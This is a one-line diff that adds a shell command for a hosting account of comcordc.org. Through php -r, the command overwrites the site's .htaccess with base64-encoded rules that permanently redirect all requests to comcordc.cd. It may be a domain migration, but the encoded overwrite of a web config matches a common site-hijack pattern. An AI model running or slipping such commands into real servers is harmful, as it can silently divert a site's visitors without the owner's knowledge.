@@ -1,0 +1,1 @@
+cd /home/u911414181/domains/comcordc.org/public_html;php -r 'file_put_contents(".htaccess",base64_decode("UmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlUnVsZSBeKC4qKSQgaHR0cHM6Ly9jb21jb3JkYy5jZC8kMSBbUj0zMDEsTF0K"));echo "OK";'
